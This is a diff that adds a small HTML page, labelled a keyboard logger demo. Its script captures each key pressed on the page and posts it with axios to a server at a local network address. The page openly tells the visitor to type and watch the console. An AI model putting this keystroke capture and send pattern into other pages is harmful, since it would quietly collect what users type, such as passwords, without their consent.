@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Keyboard Logger Frontend</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
+  </style>
+</head>
+
+<body style="color: rgb(6, 181, 250);">
+  <h1>Keyboard Logger</h1>
+  <p>First run "server.py"</p>
+  <p>Then end up on this webpage and press any key you want (keep an eye on the console)</p>
+
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script>
+    document.addEventListener('keypress', function (event) {
+      const pressedKey = event.key;
+      console.log('Key pressed:', pressedKey);
+      sendDataToServer(pressedKey);
+    });
+
+    function sendDataToServer(key) {
+      const serverUrl = 'http://192.168.1.10:5000';
+      axios.post(serverUrl, { key })
+        .catch(error => {
+          console.error('Error sending data:', error.message);
+        });
+    }
+  </script>
+</body>
+
+</html>
